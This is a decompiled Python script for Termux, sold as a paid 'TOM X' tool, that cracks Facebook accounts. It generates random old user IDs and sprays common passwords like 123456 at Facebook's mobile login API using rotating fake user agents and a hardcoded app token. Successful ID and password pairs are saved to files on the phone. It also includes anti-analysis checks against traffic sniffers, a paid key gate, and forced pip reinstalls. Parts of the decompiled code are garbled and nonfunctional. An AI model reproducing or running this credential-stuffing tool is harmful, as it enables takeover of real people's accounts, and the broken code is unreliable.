# C (1687712009)
#decoded by Forid
global loop
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import os
import sys
import subprocess
import shutil
import time
channel_link = 'https://chat.whatsapp.com/HXz1fV4a6EKBvi7zJgAC02'
approved_keys = ['BRAN']
GREEN = '[1;32m'
RESET = '[0m'
MAX_ATTEMPTS = 3
COOLDOWN_SECONDS = 8
def clear_screen():
    os.system('clear')
def open_link(url):
    if shutil.which('termux-open-url'):
        subprocess.run(['termux-open-url', url], check=False)
    else:
        if shutil.which('xdg-open'):
            subprocess.run(['xdg-open', url], check=False)
        else:
            subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', url], check=False)
def normalize(s):
    """\n    Normalize string for comparison:\n    - strip leading/trailing whitespace\n    - collapse multiple internal spaces to single\n    - lower-case for case-insensitive compare\n    """
    if s is None:
        return ''
    else:
        return ' '.join(s.split()).lower()
approved_normalized = {normalize(k) for k in approved_keys}
def first_step():
    clear_screen()
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'        {GREEN}🔒 Script Locked TOM 🔒{RESET}')
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
    print(f'{GREEN} THIS TOOL IS PAID ✅ {RESET}\n')
    print('Please open the admin/channel on WhatsApp first and then get the key.\n')
    print('Channel link: https://whatsapp.com/channel/0029VbBjC3HIXnlveslWz81L')
    if not channel_link.startswith('http://') and (not channel_link.startswith('https://')):
        print('Invalid link format — URL must start with http/https.')
    else:
        try:
            open_link(channel_link)
            print('Tried to open the channel. If WhatsApp doesn\'t open automatically, check manually.')
        except Exception as e:
            print(f'Error while opening link: {e}')
    input('\nPress Enter when you\'re ready...')
def check_key():
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        user_key = input('\nEnter your key (visible): ')
        user_norm = normalize(user_key)
        if user_norm in approved_normalized:
            print(f'\n{GREEN}Key approved! Script is running...{RESET}\n')
            return True
        attempts += 1
        remaining = MAX_ATTEMPTS - attempts
        print(f'\n{GREEN}Invalid key! Attempts left: {remaining}{RESET}')
    print(f'\n[!] Too many wrong attempts. Wait {COOLDOWN_SECONDS} seconds.')
    time.sleep(COOLDOWN_SECONDS)
    sys.exit(1)
if __name__ == '__main__':
    first_step()
    check_key()
    print('>>> Tool Successfully Unlocked <<<')
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()
os.system('clear')
print(' [38;5;46mTOMX SERVER LOADING....')
os.system('xdg-open ')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
os.system('xdg-open ')
print('loading Modules ...\n')
os.system('clear')
print(' speak[38;5;46mTOM X SERVER SUCCESSFUL LOGIN....')
os.system('https://chat.whatsapp.com/F74jqGINhHZ9Fl7jHEIp1o?mode=hqrt2')
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass
class sec:
    """\n    A security class to detect debugging and packet sniffing tools.\n    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = ['/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py']
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()
    def fuck(self):
        """\n        Terminates the script if tampering is detected.\n        """
        print(' [1;32m Congratulations ! ')
        self.linex()
        exit()
    def linex(self):
        print('[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━')
method = []
oks = []
cps = []
loop = 0
user = []
X = '[1;37m'
rad = '[38;5;196m'
G = '[38;5;46m'
Y = '[38;5;220m'
PP = '[38;5;203m'
RR = '[38;5;196m'
GS = '[38;5;40m'
W = '[1;37m'
def windows():
    """\n    Generates a random Windows User-Agent string.\n    """
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'
    return random.choice([A, B, C, D])
def window1():
    """\n    Generates another variant of a random Windows User-Agent string.\n    """
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])
sys.stdout.write(']2;𓆩【TOM X 404】𓆪 \a')
def ____banner____():
    """\n    Displays the main banner and tool information.\n    """
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print('[1;31m─────────────────────────────────────────────────────────────────[0m')
    tom_logo = '\n        ████████╗░█████╗░███╗░░░███╗\n        ╚══██╔══╝██╔══██╗████╗░████║\n        ░░░██║░░░██║░░██║██╔████╔██║\n        ░░░██║░░░██║░░██║██║╚██╔╝██║\n        ░░░██║░░░╚█████╔╝██║░╚═╝░██║\n        ░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝\n'
    print('[1;36m' + tom_logo + '[0m')
    print('[38;5;15m================================================')
    print('[38;5;15m [•] [1;95m𝐀𝐔𝐓𝐇𝐎𝐑     [38;5;15m:   [1;92m𝗧𝗢𝗠 𝗫-𝟰𝟳')
    print('[38;5;15m [•] [1;95m𝐒𝐘𝐒𝐓𝐄𝐌     [38;5;15m:   [1;92m𝗗𝗔𝗧𝗔--𝗪𝗜𝗙𝗜')
    print('[38;5;15m [•] [1;95m𝐒𝐓𝐀𝐓𝐔𝐒     [38;5;15m:   [1;92m𝙋𝘼𝙄𝘿')
    print('[38;5;15m================================================')
    print('[38;5;15m [•] [1;95m𝕍𝔼ℝ𝕊𝕀𝕆ℕ [38;5;15m   :   [1;93m𝟏.𝟎  [1;92m𝙇𝙐𝙎𝙃 𝙎𝙋𝙀𝙀𝘿 -47')
    print('[38;5;15m----------------------------------------------')
____banner____()
def creationyear(uid):
    """\n    Estimates the Facebook account creation year based on the UID.\n    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        else:
            if uid.startswith('100000000'):
                return '2009'
            else:
                if uid.startswith('10000000'):
                    return '2009'
                else:
                    if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
                        return '2009'
                    else:
                        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
                            return '2010'
                        else:
                            if uid.startswith('100001'):
                                return '2010'
                            else:
                                if uid.startswith(('100002', '100003')):
                                    return '2011'
                                else:
                                    if uid.startswith('100004'):
                                        return '2012'
                                    else:
                                        if uid.startswith(('100005', '100006')):
                                            return '2013'
                                        else:
                                            if uid.startswith(('100007', '100008')):
                                                return '2014'
                                            else:
                                                if uid.startswith('100009'):
                                                    return '2015'
                                                else:
                                                    if uid.startswith('10001'):
                                                        return '2016'
                                                    else:
                                                        if uid.startswith('10002'):
                                                            return '2017'
                                                        else:
                                                            if uid.startswith('10003'):
                                                                return '2018'
                                                            else:
                                                                if uid.startswith('10004'):
                                                                    return '2019'
                                                                else:
                                                                    if uid.startswith('10005'):
                                                                        return '2020'
                                                                    else:
                                                                        if uid.startswith('10006'):
                                                                            return '2021'
                                                                        else:
                                                                            if uid.startswith('10009'):
                                                                                return '2023'
                                                                            else:
                                                                                if uid.startswith(('10007', '10008')):
                                                                                    return '2022'
                                                                                else:
                                                                                    return ''
    else:
        if len(uid) in [9, 10]:
            return '2008'
        else:
            if len(uid) == 8:
                return '2007'
            else:
                if len(uid) == 7:
                    return '2006'
                else:
                    if len(uid) == 14 and uid.startswith('61'):
                        return '2024'
                    else:
                        return ''
def clear():
    os.system('clear')
import os
import subprocess
import requests
import urllib.parse
a = str(os.geteuid())
b = str(os.geteuid())
try:
    build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
except:
    build = 'UNKNOWN'
x = (a + build + b).upper().replace('.', '')
z = 'X'.join(x)
keys = z[15:]
final_key = 'TOM-' + keys
def approval_check_online():
    # irreducible cflow, using cdg fallback
    # ***<module>.approval_check_online: Failure: Compilation Error
    link = 'https://raw.githubusercontent.com/WORKING-110/TM-BRAND/refs/heads/main/APPROVAL.TXT'
    print('[1;35m')
    print('╔══════════════════════════════════════════════════════╗')
    print('║                 [1;32m🔥 TOM PAID TOOL 🔥[1;35m                    ║')
    print('║          [1;36mPremium • Fast • Secure • Professional[1;35m        ║')
    print('╚══════════════════════════════════════════════════════╝[0m\n')
    logo = [('████████╗░█████╗░███╗░░░███╗', '[1;91m'), ('╚══██╔══╝██╔══██╗████╗░████║', '[1;92m'), ('░░░██║░░░██║░░██║██╔████╔██║', '[1;93m'), ('░░░██║░░░██║░░██║██║╚██╔╝██║', '[1;94m'), ('░░░██║░░░╚█████╔╝██║░╚═╝░██║', '[1;95m'), ('░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝', '[1;96m')]
    for text, color in logo:
        print(color + text + '[0m')
    print('      [1;36m[[97;1m•[1;36m] [97;1mSend Key TOM X.')
    print('      [1;36m[[97;1m•[1;36m] [97;1m07 Days Apprval 350rs')
    print('      [1;36m[[97;1m•[1;36m] [97;1m15 Days Apprval 550rs')
    print('      [1;36m[[97;1m•[1;36m] [97;1m30 Days Apprval 950rs')
    choice = input('Select your pricing option (1/2/3): ').strip()
    while choice not in ['1', '2', '3']:
        choice = input('Invalid option! Please choose 1, 2, or 3: ').strip()
    prices = {'1': '350 rs', '2': '550rs', '3': '950rs'}
    selected_price = prices[choice]
    print(f'\n[1;36mYou selected: {selected_price}[0m\n')
    print(f'[1;33m🔑 Your Device Key:[0m [1;32m{final_key}[0m\n')
    response = requests.get(link)
    if response.status_code == 200:
        approved_keys = response.text.splitlines()
        if final_key in approved_keys:
            print('[1;32m✅ Approval Successful! Welcome 😎[0m')
                return
            print('[1;31m❌ Your key is not approved.[0m')
            print('📞 Contact Admin via WhatsApp')
            input('Press Enter to open WhatsApp chat with your key...')
            wa_number = '923701729896'
            wa_message = urllib.parse.quote(final_key)
            wa_link = f'https://wa.me/{wa_number}?text={wa_message}'
            os.system(f'termux-open-url \'{wa_link}\'')
            exit()
        print('❌ Failed to fetch key list. Status:', response.status_code)
        exit()
                except Exception as e:
                        print(f'❌ Error during approval check: {str(e)}')
                        exit()
approval_check_online()
def linex():
    print('[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def BNG_71_():
    """\n    Main menu function.\n    """
    ____banner____()
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOLD CLONE')
    linex()
    __Jihad__ = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE  {W}: {Y}')
    if __Jihad__ in ['A', 'a', '01', '1']:
        old_clone()
    else:
        print(f'\n    {rad}Choose Valid Option... ')
        time.sleep(2)
        BNG_71_()
def old_clone():
    """\n    Menu for selecting old account cloning type.\n    """
    ____banner____()
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mALL SERIES')
    linex()
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m100003/4 SERIES')
    linex()
    print('       [38;5;196m([1;37mC[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46m2009 series')
    linex()
    _input = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE  {W}: {Y}')
    if _input in ['A', 'a', '01', '1']:
        old_One()
    else:
        if _input in ['B', 'b', '02', '2']:
            old_Tow()
        else:
            if _input in ['C', 'c', '03', '3']:
                old_Tree()
            else:
                print(f'\n[×]{rad} Choose Value Option... ')
                BNG_71_()
def old_One():
    """\n    Cloning method for accounts from 2010-2014.\n    """
    user = []
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOld Code {Y}:{G} 2010-2014')
    ask = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMETHOD 1')
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMETHOD 2')
    linex()
    meth = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}')
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                if meth == 'B':
                    pool.submit(login_2, uid)
                else:
                    print(f'    {rad}[!] INVALID METHOD SELECTED')
                    break
def old_Tow():
    """\n    Cloning method for accounts with specific prefixes.\n    """
    user = []
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOLD CODE {Y}:{G} 2010-2014')
    ask = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMETHOD A')
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMETHOD B')
    linex()
    meth = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}')
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                if meth == 'B':
                    pool.submit(login_2, uid)
                else:
                    print(f'    {rad}[!] INVALID METHOD SELECTED')
                    break
def old_Tree():
    """\n    Cloning method for accounts from 2009-2010.\n    """
    user = []
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mOLD CODE {Y}:{G} 2009-2010')
    ask = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mSELECT {Y}:{G} ')
    linex()
    ____banner____()
    print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999')
    limit = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mTOTAL ID COUNT {Y}:{G} ')
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMETHOD A')
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mMethod B')
    linex()
    meth = input(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mCHOICE {W}(A/B): {Y}').strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}')
        print(f'       [38;5;196m([1;37m★[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}')
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                if meth == 'B':
                    pool.submit(login_2, uid)
                else:
                    print(f'    {rad}[!] INVALID METHOD SELECTED')
                    break
def login_1(uid):
    """\n    Login attempt method 1.\n    """
    global loop
    # ***<module>.login_1: Failure: Different bytecode
    session = requests.session()
    try:
        sys.stdout.write(f'\r\r[1;37m>[38;5;196m+[1;37m<[38;5;196m([1;37mTOM X-M1[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([38;5;192m{loop}[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([1;37mOK[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([38;5;192m{len(oks)}[38;5;196m)')
        sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789']:
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 'password': str(pw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': {'method': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}}
            headers = {'user-agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f'\r\r[1;37m>[38;5;196m├Ч[1;37m<[38;5;196m([1;37mDTOM X[38;5;196m) [1;97m= [38;5;46m{uid} [1;97m= [38;5;46m{pw} [1;97m= [38;5;45m{creationyear(uid)}')
                open('/sdcard/TOM X-OLD-M1-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
            else:
                if 'www.facebook.com' in res.get('error', {}).get('message', ''):
                    print(f'\r\r[1;37m>[38;5;196m├Ч[1;37m<[38;5;196m([1;37mTOM X[38;5;196m) [1;97m= [38;5;46m{uid} [1;97m= [38;5;46m{pw} [1;97m= [38;5;45m{creationyear(uid)}')
                    open('/sdcard/TOM X-OLD-M1-OK.txt', 'a').write(f'{uid}|{pw}\n')
                    oks.append(uid)
                    break
        loop += 1
    except Exception:
        time.sleep(5)
def login_2(uid):
    # irreducible cflow, using cdg fallback
    """\n    Login attempt method 2.\n    """
    # ***<module>.login_2: Failure: Compilation Error
    sys.stdout.write(f'\r\r[1;37m>[38;5;196m+[1;37m<[38;5;196m([1;37mTOM X-M2[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([38;5;192m{loop}[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([1;37mOK[38;5;196m)[1;37m>[38;5;196m×[1;37m<[38;5;196m([38;5;192m{len(oks)}[38;5;196m)')
    for pw in ['123456', '123123', '1234567', '12345678', '123456789']:
        pass
    with requests.Session() as session:
        pass
    headers = {'x-fb-connection-bandwidth': str(rr(20000000, 29999999)), 'x-fb-sim-hni': str(rr(20000, 40000)), 'x-fb-net-hni': str(rr(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': window1(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
    url = f'https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
    po = session.get(url, headers=headers).json()
    if 'session_key' in str(po):
        pass
    print(f'\r\r[1;37m>[38;5;196m├Ч[1;37m<[38;5;196m([1;37mTOM X[38;5;196m) [1;97m= [38;5;46m{uid} [1;97m= [38;5;46m{pw} [1;97m= [38;5;45m{creationyear(uid)}')
    open('/sdcard/TOM X-OLD-M2-OK.txt', 'a').write(f'{uid}|{pw}\n')
    oks.append(uid)
    if 'session_key' in po:
        pass
    print(f'\r\r[1;37m>[38;5;196m├Ч[1;37m<[38;5;196m([1;37mTOM X[38;5;196m) [1;97m= [38;5;46m{uid} [1;97m= [38;5;46m{pw} [1;97m= [38;5;45m{creationyear(uid)}')
    open('/sdcard/TOM X-OLD-M2-OK.txt', 'a').write(f'{uid}|{pw}\n')
    oks.append(uid)
    loop += 1
    except Exception as e:
        pass
    pass
if __name__ == '__main__':
    BNG_71_()
